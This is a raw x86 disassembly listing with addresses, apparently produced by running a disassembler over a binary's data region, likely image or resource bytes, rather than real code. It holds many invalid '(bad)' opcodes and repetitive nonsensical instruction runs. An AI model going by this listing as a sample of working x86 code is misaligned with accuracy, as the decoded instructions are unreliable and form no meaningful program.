11016300:	lock add BYTE PTR [eax],al
11016303:	add    BYTE PTR [ecx],al
11016305:	inc    DWORD PTR [eax]
11016307:	push   cs
11016308:	loopne 0x1101630a
1101630a:	add    BYTE PTR [eax],al
1101630c:	add    edi,edi
1101630e:	add    BYTE PTR [esi],cl
11016310:	loopne 0x11016312
11016312:	add    BYTE PTR [eax],al
11016314:	add    bh,bh
11016316:	add    BYTE PTR [esi],cl
11016318:	loopne 0x1101631a
1101631a:	add    BYTE PTR [eax],al
1101631c:	add    bh,bh
1101631e:	add    BYTE PTR [esi],cl
11016320:	loopne 0x11016322
11016322:	add    BYTE PTR [eax],al
11016324:	add    bh,bh
11016326:	add    BYTE PTR [esi],cl
11016328:	loopne 0x1101632a
1101632a:	add    BYTE PTR [eax],al
1101632c:	add    bh,bh
1101632e:	add    BYTE PTR [esi],cl
11016330:	loopne 0x11016332
11016332:	add    BYTE PTR [eax],al
11016334:	add    bh,bh
11016336:	add    BYTE PTR [esi],cl
11016338:	loopne 0x1101633a
1101633a:	add    BYTE PTR [eax],al
1101633c:	add    bh,bh
1101633e:	add    BYTE PTR [esi],cl
11016340:	loopne 0x11016342
11016342:	add    BYTE PTR [eax],al
11016344:	add    bh,bh
11016346:	add    BYTE PTR [esi],cl
11016348:	rol    BYTE PTR [eax],0x0
1101634b:	add    BYTE PTR [eax],al
1101634d:	inc    DWORD PTR [eax]
1101634f:	push   cs
11016350:	add    BYTE PTR [eax],0x0
11016353:	add    BYTE PTR [eax],al
11016355:	inc    DWORD PTR [eax]
11016357:	push   cs
11016358:	add    BYTE PTR [eax],0x0
1101635b:	add    BYTE PTR [eax],al
1101635d:	inc    DWORD PTR [eax]
1101635f:	push   cs
11016360:	add    BYTE PTR [eax],al
11016362:	add    BYTE PTR [eax],al
11016364:	add    bh,bh
11016366:	add    BYTE PTR [esi],cl
11016368:	add    BYTE PTR [eax],al
1101636a:	add    BYTE PTR [eax],al
1101636c:	add    bh,bh
1101636e:	add    BYTE PTR [esi],cl
11016370:	add    BYTE PTR [eax],al
11016372:	add    BYTE PTR [eax],al
11016374:	add    bh,bh
11016376:	add    BYTE PTR [esi],cl
11016378:	add    BYTE PTR [eax],al
1101637a:	add    BYTE PTR [eax],al
1101637c:	add    bh,bh
1101637e:	add    BYTE PTR [esi],cl
11016380:	add    BYTE PTR [eax],al
11016382:	add    BYTE PTR [eax],al
11016384:	add    bh,bh
11016386:	add    BYTE PTR [esi],cl
11016388:	add    BYTE PTR [eax],al
1101638a:	add    BYTE PTR [eax],al
1101638c:	add    bh,bh
1101638e:	add    BYTE PTR [esi],cl
11016390:	add    BYTE PTR [eax],al
11016392:	add    BYTE PTR [eax],al
11016394:	add    bh,bh
11016396:	add    BYTE PTR [esi],cl
11016398:	add    BYTE PTR [eax],al
1101639a:	add    BYTE PTR [eax],al
1101639c:	add    bh,bh
1101639e:	add    BYTE PTR [esi],cl
110163a0:	add    BYTE PTR [eax],al
110163a2:	add    BYTE PTR [eax],al
110163a4:	add    bh,bh
110163a6:	add    BYTE PTR [esi],cl
110163a8:	add    BYTE PTR [eax],0x0
110163ab:	add    BYTE PTR [eax],al
110163ad:	inc    DWORD PTR [eax]
110163af:	push   cs
110163b0:	rol    BYTE PTR [eax],0x0
110163b3:	add    BYTE PTR [eax],al
110163b5:	inc    DWORD PTR [eax]
110163b7:	push   cs
110163b8:	loopne 0x110163ba
110163ba:	add    BYTE PTR [eax],al
110163bc:	add    bh,bh
110163be:	add    BYTE PTR [esi],cl
110163c0:	loopne 0x110163c2
110163c2:	add    BYTE PTR [eax],al
110163c4:	add    bh,bh
110163c6:	add    BYTE PTR [esi],cl
110163c8:	loopne 0x110163ca
110163ca:	add    BYTE PTR [eax],al
110163cc:	add    bh,bh
110163ce:	add    BYTE PTR [esi],cl
110163d0:	loopne 0x110163d2
110163d2:	add    BYTE PTR [eax],al
110163d4:	add    bh,bh
110163d6:	add    BYTE PTR [esi],cl
110163d8:	loopne 0x110163da
110163da:	add    BYTE PTR [eax],al
110163dc:	add    bh,bh
110163de:	add    BYTE PTR [esi],cl
110163e0:	loopne 0x110163e2
110163e2:	add    BYTE PTR [eax],al
110163e4:	add    bh,bh
110163e6:	add    BYTE PTR [esi],cl
110163e8:	loopne 0x110163ea
110163ea:	add    BYTE PTR [eax],al
110163ec:	add    bh,bh
110163ee:	add    BYTE PTR [esi],cl
110163f0:	loopne 0x110163f2
110163f2:	add    BYTE PTR [eax],al
110163f4:	add    bh,bh
110163f6:	add    BYTE PTR [esi],cl
110163f8:	loopne 0x110163fa
110163fa:	add    BYTE PTR [eax],al
110163fc:	add    edi,edi
110163fe:	add    BYTE PTR [esi],cl
11016400:	loopne 0x11016402
11016402:	add    BYTE PTR [eax],al
11016404:	add    edi,edi
11016406:	add    BYTE PTR [esi],cl
11016408:	lock add BYTE PTR [eax],al
1101640b:	add    BYTE PTR [ecx],al
1101640d:	inc    DWORD PTR [eax]
1101640f:	push   cs
11016410:	clc    
11016411:	add    BYTE PTR [eax],al
11016413:	add    BYTE PTR [edi],al
11016415:	inc    DWORD PTR [eax]
11016417:	push   cs
11016418:	(bad)  
11016419:	inc    BYTE PTR [eax]
1101641b:	jg     0x1101641c
1101641d:	inc    DWORD PTR [eax]
1101641f:	push   cs
11016420:	(bad)  
11016421:	inc    DWORD PTR [eax]
11016423:	(bad)  
11016424:	(bad)  
11016425:	inc    DWORD PTR [eax]
11016427:	push   cs
11016428:	(bad)  
11016429:	inc    DWORD PTR [ecx+0xffffff]
1101642f:	push   cs
11016430:	sub    BYTE PTR [eax],al
11016432:	add    BYTE PTR [eax],al
11016434:	and    BYTE PTR [eax],al
11016436:	add    BYTE PTR [eax],al
11016438:	inc    eax
11016439:	add    BYTE PTR [eax],al
1101643b:	add    BYTE PTR [ecx],al
1101643d:	add    BYTE PTR [eax],ah
	...
1101646f:	add    DWORD PTR [eax],eax
11016471:	add    BYTE PTR [eax],al
11016473:	add    DWORD PTR [eax],eax
11016475:	add    BYTE PTR [eax],al
11016477:	add    DWORD PTR [eax],eax
11016479:	add    BYTE PTR [eax],al
1101647b:	add    DWORD PTR [eax],eax
1101647d:	add    BYTE PTR [eax],al
1101647f:	add    DWORD PTR [eax],eax
11016481:	add    BYTE PTR [eax],al
11016483:	add    al,BYTE PTR [eax]
11016485:	add    BYTE PTR [eax],al
11016487:	pop    es
11016488:	add    BYTE PTR [eax],al
1101648a:	add    BYTE PTR [ebx],bl
1101648c:	add    BYTE PTR [eax],al
1101648e:	add    BYTE PTR [eax+0x0],cl
11016491:	add    BYTE PTR [eax],al
11016493:	mov    BYTE PTR [eax],al
11016495:	add    BYTE PTR [eax],al
11016497:	lds    eax,FWORD PTR [eax]
11016499:	add    BYTE PTR [eax],al
1101649b:	lds    eax,FWORD PTR [eax]
1101649d:	add    BYTE PTR [eax],al
1101649f:	xchg   DWORD PTR [eax],eax
110164a1:	add    BYTE PTR [eax],al
110164a3:	inc    edi
110164a4:	add    BYTE PTR [eax],al
110164a6:	add    BYTE PTR [ebx],bl
110164a8:	add    BYTE PTR [eax],al
110164aa:	add    BYTE PTR [edi],al
110164ac:	add    BYTE PTR [eax],al
110164ae:	add    BYTE PTR [edx],al
110164b0:	add    BYTE PTR [eax],al
110164b2:	add    BYTE PTR [ecx],al
110164b4:	add    BYTE PTR [eax],al
110164b6:	add    BYTE PTR [ecx],al
110164b8:	add    BYTE PTR [eax],al
110164ba:	add    BYTE PTR [ecx],al
110164bc:	add    BYTE PTR [eax],al
110164be:	add    BYTE PTR [ecx],al
110164c0:	add    BYTE PTR [eax],al
110164c2:	add    BYTE PTR [ecx],al
110164c4:	add    BYTE PTR [eax],al
110164c6:	add    BYTE PTR [ecx],al
110164c8:	add    BYTE PTR [eax],al
110164ca:	add    BYTE PTR [ecx],al
	...
110164e4:	add    BYTE PTR [eax],al
110164e6:	add    BYTE PTR [ecx],al
110164e8:	add    BYTE PTR [eax],al
110164ea:	add    BYTE PTR [esi],al
110164ec:	add    BYTE PTR [eax],al
110164ee:	add    BYTE PTR ds:0x11000000,cl
110164f4:	add    BYTE PTR [eax],al
110164f6:	add    BYTE PTR [ebx],dl
110164f8:	add    BYTE PTR [eax],al
110164fa:	add    BYTE PTR [ebx],dl
110164fc:	add    BYTE PTR [eax],al
110164fe:	add    BYTE PTR [ebx],dl
11016500:	add    BYTE PTR [eax],al
11016502:	add    BYTE PTR [eax],bl
11016504:	add    BYTE PTR [eax],al
11016506:	add    BYTE PTR [edx],ch
11016508:	add    BYTE PTR [eax],al
1101650a:	add    BYTE PTR [eax+eax*1+0x0],dl
1101650e:	add    BYTE PTR [ecx-0x2e000000],dl
11016514:	or     eax,0xcfd0d0d
11016519:	or     al,0xc
1101651b:	std    
1101651c:	add    BYTE PTR [eax],al
1101651e:	add    dl,dl
11016520:	add    BYTE PTR [eax],al
11016522:	add    BYTE PTR [eax+0x53000000],dl
11016528:	add    BYTE PTR [eax],al
1101652a:	add    BYTE PTR [edx],ch
1101652c:	add    BYTE PTR [eax],al
1101652e:	add    BYTE PTR [eax],bl
11016530:	add    BYTE PTR [eax],al
11016532:	add    BYTE PTR [ebx],dl
11016534:	add    BYTE PTR [eax],al
11016536:	add    BYTE PTR [ebx],dl
11016538:	add    BYTE PTR [eax],al
1101653a:	add    BYTE PTR [ebx],dl
1101653c:	add    BYTE PTR [eax],al
1101653e:	add    BYTE PTR [ebx],dl
11016540:	add    BYTE PTR [eax],al
11016542:	add    BYTE PTR [ebx],dl
11016544:	add    BYTE PTR [eax],al
11016546:	add    BYTE PTR [ecx],dl
11016548:	add    BYTE PTR [eax],al
1101654a:	add    BYTE PTR ds:0x6000000,cl
11016550:	add    BYTE PTR [eax],al
11016552:	add    BYTE PTR [ecx],al
	...
11016564:	add    BYTE PTR [eax],al
11016566:	add    BYTE PTR [esi],al
11016568:	add    BYTE PTR [eax],al
1101656a:	add    BYTE PTR [ecx],bl
1101656c:	add    BYTE PTR [eax],al
1101656e:	add    BYTE PTR [edi],dh
11016570:	add    BYTE PTR [eax],al
11016572:	add    BYTE PTR [edx+0x0],cl
11016575:	add    BYTE PTR [eax],al
11016577:	push   eax
11016578:	add    BYTE PTR [eax],al
1101657a:	add    BYTE PTR [eax+0x0],dl
1101657d:	add    BYTE PTR [eax],al
1101657f:	push   esp
11016580:	add    BYTE PTR [eax],al
11016582:	add    BYTE PTR [ecx+0x0],ah
11016585:	add    BYTE PTR [eax],al
11016587:	jg     0x11016589
11016589:	add    BYTE PTR [eax],al
1101658b:	lods   al,BYTE PTR ds:[esi]
1101658c:	add    BYTE PTR [eax],al
1101658e:	add    ah,bl
11016590:	or     eax,0xc2fd0d0d
11016595:	ret    0xffc2
11016598:	rol    ecx,0xc1
1101659b:	dec    DWORD PTR [esp+ecx*1]
1101659e:	or     al,0xfd
110165a0:	add    BYTE PTR [eax],al
110165a2:	add    ah,bl
110165a4:	add    BYTE PTR [eax],al
110165a6:	add    BYTE PTR [eax+eax*1+0x7f0000],ch
110165ad:	add    BYTE PTR [eax],al
110165af:	popa   
110165b0:	add    BYTE PTR [eax],al
110165b2:	add    BYTE PTR [eax+eax*1+0x0],dl
110165b6:	add    BYTE PTR [eax+0x0],dl
110165b9:	add    BYTE PTR [eax],al
110165bb:	push   eax
110165bc:	add    BYTE PTR [eax],al
110165be:	add    BYTE PTR [eax+0x0],dl
110165c1:	add    BYTE PTR [eax],al
110165c3:	push   eax
110165c4:	add    BYTE PTR [eax],al
110165c6:	add    BYTE PTR [edx+0x0],cl
110165c9:	add    BYTE PTR [eax],al
110165cb:	aaa    
110165cc:	add    BYTE PTR [eax],al
110165ce:	add    BYTE PTR [ecx],bl
110165d0:	add    BYTE PTR [eax],al
110165d2:	add    BYTE PTR [esi],al
	...
110165e0:	add    BYTE PTR [eax],al
110165e2:	add    BYTE PTR [ecx],al
110165e4:	add    BYTE PTR [eax],al
110165e6:	add    BYTE PTR ds:0x37000000,cl
110165ec:	add    BYTE PTR [eax],al
110165ee:	add    BYTE PTR [eax+0x0],bh
110165f1:	add    BYTE PTR [eax],al
110165f3:	mov    ds:0xae000000,al
110165f8:	add    BYTE PTR [eax],al
110165fa:	add    BYTE PTR [eax-0x4a000000],dh
11016600:	add    BYTE PTR [eax],al
11016602:	add    bl,al
11016604:	add    BYTE PTR [eax],al
11016606:	add    al,bl
11016608:	add    BYTE PTR [eax],al
1101660a:	add    dh,ch
1101660c:	or     eax,0xc2fe0d0d
11016611:	ret    0xffc2
11016614:	std    
11016615:	std    
11016616:	std    
11016617:	(bad)  
11016618:	std    
11016619:	std    
1101661a:	std    
1101661b:	inc    ecx
1101661d:	rol    ecx,0xff
11016620:	or     al,0xc
11016622:	or     al,0xfe
11016624:	add    BYTE PTR [eax],al
11016626:	add    dh,ch
11016628:	add    BYTE PTR [eax],al
1101662a:	add    al,bl
1101662c:	add    BYTE PTR [eax],al
1101662e:	add    bl,al
11016630:	add    BYTE PTR [eax],al
11016632:	add    BYTE PTR [esi-0x50000000],dh
11016638:	add    BYTE PTR [eax],al
1101663a:	add    BYTE PTR [edi-0x51000000],ch
11016640:	add    BYTE PTR [eax],al
11016642:	add    BYTE PTR [esi-0x5e000000],ch
11016648:	add    BYTE PTR [eax],al
1101664a:	add    BYTE PTR [eax+0x0],bh
1101664d:	add    BYTE PTR [eax],al
1101664f:	aaa    
11016650:	add    BYTE PTR [eax],al
11016652:	add    BYTE PTR ds:0x1000000,cl
	...
11016660:	add    BYTE PTR [eax],al
11016662:	add    BYTE PTR [ecx],al
11016664:	add    BYTE PTR [eax],al
11016666:	add    BYTE PTR [ecx],dl
11016668:	add    BYTE PTR [eax],al
1101666a:	add    bh,bh
1101666c:	add    BYTE PTR [eax],al
1101666e:	add    bh,bh
11016670:	add    BYTE PTR [eax],al
11016672:	add    bh,bh
11016674:	add    BYTE PTR [eax],al
11016676:	add    bh,bh
11016678:	add    BYTE PTR [eax],al
1101667a:	add    bh,bh
1101667c:	add    BYTE PTR [eax],al
1101667e:	add    bh,bh
11016680:	add    BYTE PTR [eax],al
11016682:	add    bh,bh
11016684:	add    BYTE PTR [eax],al
11016686:	add    bh,bh
11016688:	or     eax,0xc2ff0d0d
1101668d:	ret    0xffc2
11016690:	std    
11016691:	std    
11016692:	std    
11016693:	(bad)  
11016694:	std    
11016695:	std    
11016696:	std    
11016697:	(bad)  
11016698:	std    
11016699:	std    
1101669a:	std    
1101669b:	(bad)  
1101669c:	std    
1101669d:	std    
1101669e:	std    
1101669f:	inc    ecx
110166a1:	rol    ecx,0xff
110166a4:	or     al,0xc
110166a6:	or     al,0xff
110166a8:	add    BYTE PTR [eax],al
110166aa:	add    bh,bh
110166ac:	add    BYTE PTR [eax],al
110166ae:	add    bh,bh
110166b0:	add    BYTE PTR [eax],al
110166b2:	add    bh,bh
110166b4:	add    BYTE PTR [eax],al
110166b6:	add    bh,bh
110166b8:	add    BYTE PTR [eax],al
110166ba:	add    bh,bh
110166bc:	add    BYTE PTR [eax],al
110166be:	add    bh,bh
110166c0:	add    BYTE PTR [eax],al
110166c2:	add    bh,bh
110166c4:	add    BYTE PTR [eax],al
110166c6:	add    bh,bh
110166c8:	add    BYTE PTR [eax],al
110166ca:	add    BYTE PTR [edx+0x4a000000],ah
110166d0:	add    BYTE PTR [eax],al
110166d2:	add    BYTE PTR [ecx],dl
110166d4:	add    BYTE PTR [eax],al
110166d6:	add    BYTE PTR [ecx],al
	...
110166e0:	add    BYTE PTR [eax],al
110166e2:	add    BYTE PTR [ecx],al
110166e4:	add    BYTE PTR [eax],al
110166e6:	add    BYTE PTR [ebx],dl
110166e8:	add    BYTE PTR [eax],al
110166ea:	add    bh,bh
110166ec:	xrelease mov DWORD PTR [edx-0x1],ebx
110166f0:	out    dx,al
110166f1:	xchg   BYTE PTR [eax-0x1],bl
110166f4:	fstp   TBYTE PTR [ebx+0x51]
110166f7:	jmp    FWORD PTR [edi+0x70ff4163]
110166fd:	aas    
110166fe:	sub    edi,edi
11016700:	sub    eax,0xeff1019
11016705:	push   cs
11016706:	or     eax,0xc2c3c3ff
1101670b:	(bad)  
1101670c:	(bad)  
1101670d:	(bad)  
1101670e:	std    
1101670f:	(bad)  
11016710:	(bad)  
11016711:	(bad)  
11016712:	std    
11016713:	(bad)  
11016714:	(bad)  
11016715:	(bad)  
11016716:	std    
11016717:	(bad)  
11016718:	std    
11016719:	std    
1101671a:	std    
1101671b:	(bad)  
1101671c:	(bad)  
1101671d:	(bad)  
1101671e:	(bad)  
1101671f:	(bad)  
11016720:	(bad)  
11016721:	(bad)  
11016722:	(bad)  
11016723:	inc    ecx
11016725:	rol    ecx,0xff
11016728:	push   cs
11016729:	or     eax,0x192dff0d
1101672e:	adc    bh,bh
11016730:	jo     0x11016771
11016732:	sub    edi,edi
11016734:	mov    al,0x63
11016736:	inc    ecx
11016737:	(bad)  
11016738:	fstp   TBYTE PTR [ecx+edx*2-0x1]
1101673c:	out    dx,al
1101673d:	xchg   BYTE PTR [eax-0x1],bl
11016740:	xrelease mov DWORD PTR [edx-0x1],ebx
11016744:	add    BYTE PTR [eax],al
11016746:	add    bh,bh
11016748:	add    BYTE PTR [eax],al
1101674a:	add    BYTE PTR [esi+0x50000000],ch
11016750:	add    BYTE PTR [eax],al
11016752:	add    BYTE PTR [ebx],dl
11016754:	add    BYTE PTR [eax],al
11016756:	add    BYTE PTR [ecx],al
	...
11016760:	add    BYTE PTR [eax],al
11016762:	add    BYTE PTR [ecx],al
11016764:	add    BYTE PTR [eax],al
11016766:	add    BYTE PTR [ebx],dl
11016768:	add    BYTE PTR [eax],al
1101676a:	add    bh,bh
1101676c:	out    dx,al
1101676d:	xchg   BYTE PTR [eax-0x1],bl
11016770:	fstp   TBYTE PTR [ebx+0x51]
11016773:	push   DWORD PTR [eax+0x70ff4163]
11016779:	aas    
1101677a:	sub    edi,edi
1101677c:	sub    eax,0xeff1019
11016781:	push   cs
11016782:	or     eax,0xc3c3c3ff
11016787:	(bad)  
11016788:	(bad)  
11016789:	(bad)  
1101678a:	(bad)  
1101678b:	(bad)  
1101678c:	(bad)  
1101678d:	(bad)  
1101678e:	std    
1101678f:	(bad)  
11016790:	(bad)  
11016791:	(bad)  
11016792:	std    
11016793:	(bad)  
11016794:	(bad)  
11016795:	(bad)  
11016796:	std    
11016797:	(bad)  
11016798:	std    
11016799:	std    
1101679a:	std    
1101679b:	(bad)  
1101679c:	(bad)  
1101679d:	(bad)  
1101679e:	(bad)  
1101679f:	(bad)  
110167a0:	(bad)  
110167a1:	(bad)  
110167a2:	(bad)  
110167a3:	(bad)  
110167a4:	std    
110167a5:	std    
110167a6:	std    
110167a7:	inc    ecx
110167a9:	rol    ecx,0xff
110167ac:	push   cs
110167ad:	or     eax,0x192dff0c
110167b2:	adc    bh,bh
110167b4:	jno    0x110167f5
110167b6:	sub    edi,edi
110167b8:	mov    al,0x63
110167ba:	inc    ecx
110167bb:	(bad)  
110167bc:	fstp   TBYTE PTR [ecx+edx*2-0x1]
110167c0:	out    dx,al
110167c1:	xchg   BYTE PTR [eax-0x1],bl
110167c4:	add    BYTE PTR [eax],al
110167c6:	add    bh,bh
110167c8:	add    BYTE PTR [eax],al
110167ca:	add    BYTE PTR [edi+0x50000000],ch
110167d0:	add    BYTE PTR [eax],al
110167d2:	add    BYTE PTR [ebx],dl
110167d4:	add    BYTE PTR [eax],al
110167d6:	add    BYTE PTR [ecx],al
	...
110167e0:	add    BYTE PTR [eax],al
110167e2:	add    BYTE PTR [ecx],al
110167e4:	add    BYTE PTR [eax],al
110167e6:	add    BYTE PTR [ebx],dl
110167e8:	add    BYTE PTR [eax],al
110167ea:	add    bh,bh
110167ec:	fstp   TBYTE PTR [ecx+edx*2-0x1]
110167f0:	mov    al,0x63
110167f2:	inc    ecx
110167f3:	push   DWORD PTR [ecx+0x40]
110167f6:	sub    edi,edi
110167f8:	sub    eax,0xeff1019
110167fd:	push   cs
110167fe:	or     eax,0xc2c3c3ff
11016803:	(bad)  
11016804:	(bad)  
11016805:	(bad)  
11016806:	std    
11016807:	(bad)  
11016808:	std    
11016809:	std    
1101680a:	std    
1101680b:	(bad)  
1101680c:	(bad)  
1101680d:	(bad)  
1101680e:	std    
1101680f:	(bad)  
11016810:	(bad)  
11016811:	(bad)  
11016812:	std    
11016813:	(bad)  
11016814:	std    
11016815:	std    
11016816:	std    
11016817:	(bad)  
11016818:	std    
11016819:	std    
1101681a:	std    
1101681b:	(bad)  
1101681c:	(bad)  
1101681d:	(bad)  
1101681e:	std    
1101681f:	(bad)  
11016820:	(bad)  
11016821:	(bad)  
11016822:	std    
11016823:	(bad)  
11016824:	std    
11016825:	std    
11016826:	std    
11016827:	(bad)  
11016828:	std    
11016829:	std    
1101682a:	std    
1101682b:	inc    ecx
1101682d:	rol    ecx,0xff
11016830:	push   cs
11016831:	or     eax,0x192dff0d
11016836:	adc    bh,bh
11016838:	jno    0x1101687a
1101683a:	sub    bh,bh
1101683c:	mov    al,0x63
1101683e:	inc    ecx
1101683f:	(bad)  
11016840:	fstp   TBYTE PTR [ecx+edx*2-0x1]
11016844:	add    BYTE PTR [eax],al
11016846:	add    bh,bh
11016848:	add    BYTE PTR [eax],al
1101684a:	add    BYTE PTR [edi+0x50000000],ch
11016850:	add    BYTE PTR [eax],al
11016852:	add    BYTE PTR [ebx],dl
11016854:	add    BYTE PTR [eax],al
11016856:	add    BYTE PTR [ecx],al
	...
11016860:	add    BYTE PTR [eax],al
11016862:	add    BYTE PTR [edx],al
11016864:	add    BYTE PTR [eax],al
11016866:	add    BYTE PTR [eax],bl
11016868:	add    BYTE PTR [eax],al
1101686a:	add    bh,bh
1101686c:	scas   eax,DWORD PTR es:[edi]
1101686d:	arpl   WORD PTR [ecx-0x1],ax
11016870:	jo     0x110168b1
11016872:	sub    edi,edi
11016874:	sub    eax,0xeff1019
11016879:	push   cs
1101687a:	or     eax,0xc3c3c3ff
1101687f:	(bad)  
11016880:	(bad)  
11016881:	(bad)  
11016882:	(bad)  
11016883:	(bad)  
11016884:	(bad)  
11016885:	(bad)  
11016886:	std    
11016887:	(bad)  
11016888:	stc    
11016889:	out    0xde,al
1101688b:	(bad)  
1101688c:	in     eax,dx
1101688d:	lods   eax,DWORD PTR ds:[esi]
1101688e:	xchg   esp,eax
1101688f:	jmp    ecx
11016891:	and    DWORD PTR [ecx-0x1],0xffffffd9
11016895:	imul   eax,DWORD PTR [edi+edi*8-0x2b],0x66
1101689a:	inc    eax
1101689b:	call   edi
1101689d:	jbe    0x110168f5
1101689f:	jmp    ecx
110168a1:	sahf   
110168a2:	mov    bh,bh
110168a4:	cmc    
110168a5:	loopne 0x11016880
110168a7:	(bad)  
110168a8:	(bad)  
110168a9:	(bad)  
110168aa:	std    
110168ab:	(bad)  
110168ac:	(bad)  
110168ad:	(bad)  
110168ae:	std    
110168af:	inc    ecx
110168b1:	rol    ecx,0xff
110168b4:	push   cs
110168b5:	or     eax,0x192dff0d
110168ba:	adc    bh,bh
110168bc:	jo     0x110168fd
110168be:	sub    edi,edi
110168c0:	mov    al,0x63
110168c2:	inc    ecx
110168c3:	inc    DWORD PTR [eax]
110168c5:	add    BYTE PTR [eax],al
110168c7:	inc    DWORD PTR [eax]
110168c9:	add    BYTE PTR [eax],al
110168cb:	mov    al,0x0
110168cd:	add    BYTE PTR [eax],al
110168cf:	push   eax
110168d0:	add    BYTE PTR [eax],al
110168d2:	add    BYTE PTR [ebx],dl
110168d4:	add    BYTE PTR [eax],al
110168d6:	add    BYTE PTR [ecx],al
	...
110168e0:	add    BYTE PTR [eax],al
110168e2:	add    BYTE PTR [edi],al
110168e4:	add    BYTE PTR [eax],al
110168e6:	add    BYTE PTR [edx],ch
110168e8:	add    BYTE PTR [eax],al
110168ea:	add    bh,bh
110168ec:	jo     0x1101692d
110168ee:	sub    edi,edi
110168f0:	sub    eax,0xeff1019
110168f5:	push   cs
110168f6:	or     eax,0xc3c3c3ff
110168fb:	(bad)  
110168fc:	(bad)  
110168fd:	(bad)  
110168fe:	(bad)  
110168ff:	(bad)  
11016900:	std    
11016901:	cli    
11016902:	clc    
11016903:	push   ebx
11016905:	mov    ch,0x9a
11016907:	jmp    edi
11016909:	jnp    0x11016959
1101690b:	jmp    edx
1101690d:	jne    0x11016958
1101690f:	(bad)  
11016910:	fidiv  WORD PTR [eax+0x45]
11016913:	(bad)  
11016914:	fld    TBYTE PTR [ebx+0x41]
11016917:	call   esi
11016919:	gs cmp eax,0x395fd2ff
1101691f:	dec    esi
11016921:	pop    edx
11016922:	xor    al,0xff
11016924:	retf   
11016925:	push   esi
11016926:	xor    edi,edi
11016928:	fistp  WORD PTR [ecx-0x603007c]
1101692e:	idiv   edi
11016930:	(bad)  
11016931:	(bad)  
11016932:	(bad)  
11016933:	inc    ecx
11016935:	rol    ecx,0xff
11016938:	push   cs
11016939:	or     eax,0x192dff0c
1101693e:	adc    bh,bh
11016940:	jo     0x11016981
11016942:	sub    edi,edi
11016944:	add    BYTE PTR [eax],al
11016946:	add    bh,bh
11016948:	add    BYTE PTR [eax],al
1101694a:	add    BYTE PTR [esi+0x54000000],dh
11016950:	add    BYTE PTR [eax],al
11016952:	add    BYTE PTR [ebx],dl
11016954:	add    BYTE PTR [eax],al
11016956:	add    BYTE PTR [ecx],al
11016958:	add    BYTE PTR [eax],al
1101695a:	add    BYTE PTR [eax],al
1101695c:	add    BYTE PTR [eax],al
1101695e:	add    BYTE PTR ds:0x1b000000,al
11016964:	add    BYTE PTR [eax],al
11016966:	add    BYTE PTR [eax+eax*1+0x0],dl
1101696a:	add    bh,bh
1101696c:	sub    eax,0xeff1019
11016971:	push   cs
11016972:	or     eax,0xc2c3c3ff
11016977:	(bad)  
11016978:	(bad)  
11016979:	(bad)  
1101697a:	(bad)  
1101697b:	(bad)  
1101697c:	std    
1101697d:	cli    
1101697e:	stc    
1101697f:	push   esi
11016981:	test   al,0x86
11016983:	(bad)  
11016984:	out    dx,al
11016985:	test   DWORD PTR [edi-0x1],edx
11016988:	jmp    0x507b:0xe7ff5380
1101698f:	jmp    ebx
11016991:	jbe    0x110169de
11016993:	(bad)  
11016994:	fbstp  TBYTE PTR [ecx+0x47]
11016997:	(bad)  
11016998:	fld    TBYTE PTR [ebx+0x42]
1101699b:	call   edi
1101699d:	cmp    ax,0xd2ff
110169a1:	pusha  
110169a2:	cmp    edi,edi
110169a4:	into   
110169a5:	pop    edx
110169a6:	xor    al,0xff
110169a8:	retf   0x2f55
110169ab:	call   edi
110169ad:	jg     0x11016a13
110169af:	(bad)  
110169b0:	cld    
110169b1:	stc    
110169b2:	idiv   edi
110169b4:	(bad)  
110169b5:	(bad)  
110169b6:	std    
110169b7:	inc    ecx
110169b9:	rol    ecx,0xff
110169bc:	push   cs
110169bd:	or     eax,0x192dff0c
110169c2:	adc    bh,bh
110169c4:	add    BYTE PTR [eax],al
110169c6:	add    bh,bh
110169c8:	add    BYTE PTR [eax],al
110169ca:	add    bl,al
110169cc:	add    BYTE PTR [eax],al
110169ce:	add    BYTE PTR [ecx+0x0],ah
110169d1:	add    BYTE PTR [eax],al
110169d3:	sbb    BYTE PTR [eax],al
110169d5:	add    BYTE PTR [eax],al
110169d7:	add    al,BYTE PTR [eax]
110169d9:	add    BYTE PTR [eax],al
110169db:	add    eax,0x19000000
110169e0:	add    BYTE PTR [eax],al
110169e2:	add    BYTE PTR [edi+0x0],al
110169e5:	add    BYTE PTR [eax],al
110169e7:	nop
110169e8:	add    BYTE PTR [eax],al
110169ea:	add    bh,bh
110169ec:	push   cs
110169ed:	push   cs
110169ee:	or     eax,0xc3c3c3ff
110169f3:	(bad)  
110169f4:	(bad)  
110169f5:	(bad)  
110169f6:	(bad)  
110169f7:	(bad)  
110169f8:	(bad)  
110169f9:	(bad)  
110169fa:	std    
110169fb:	(bad)  
110169fc:	clc    
110169fd:	mov    ebx,0x8cf3ffa0
11016a02:	pop    ebp
11016a03:	push   edx
11016a05:	mov    WORD PTR [esi-0x1],ds
11016a08:	out    dx,eax
11016a09:	mov    BYTE PTR [edx-0x1],bl
11016a0c:	jmp    0x11016991
11016a0e:	push   esi
11016a0f:	jmp    edi
11016a11:	jge    0x11016a65
11016a13:	jmp    esp
11016a15:	ja     0x11016a64
11016a17:	(bad)  
11016a18:	fbstp  TBYTE PTR [ecx+0x48]
11016a1b:	(bad)  
11016a1c:	fld    TBYTE PTR [ebx+eax*2-0x1]
11016a20:	xlat   BYTE PTR ds:[ebx]
11016a21:	notrack call bx
11016a25:	pusha  
11016a26:	cmp    edi,edi
11016a28:	into   
11016a29:	pop    edx
11016a2a:	xor    al,0xff
11016a2c:	retf   0x3055
11016a2f:	(bad)  
11016a30:	fistp  WORD PTR [ecx-0x101007c]
11016a36:	std    
11016a37:	(bad)  
11016a38:	std    
11016a39:	std    
11016a3a:	std    
11016a3b:	inc    ecx
11016a3d:	rol    ecx,0xff
11016a40:	push   cs
11016a41:	or     eax,0xff0d
11016a46:	add    bh,bh
11016a48:	add    BYTE PTR [eax],al
11016a4a:	add    al,bl
11016a4c:	add    BYTE PTR [eax],al
11016a4e:	add    BYTE PTR [edi+0x0],bh
11016a51:	add    BYTE PTR [eax],al
11016a53:	sub    al,BYTE PTR [eax]
11016a55:	add    BYTE PTR [eax],al
11016a57:	push   es
11016a58:	add    BYTE PTR [eax],al
11016a5a:	add    BYTE PTR [eax],bl
11016a5c:	add    BYTE PTR [eax],al
11016a5e:	add    BYTE PTR [esi+0x0],al
11016a61:	add    BYTE PTR [eax],al
11016a63:	mov    al,BYTE PTR [eax]
11016a65:	add    BYTE PTR [eax],al
11016a67:	ror    BYTE PTR ds:0xc3ff0d0d,cl
11016a6d:	ret    
11016a6e:	ret    0xfdff
11016a71:	std    
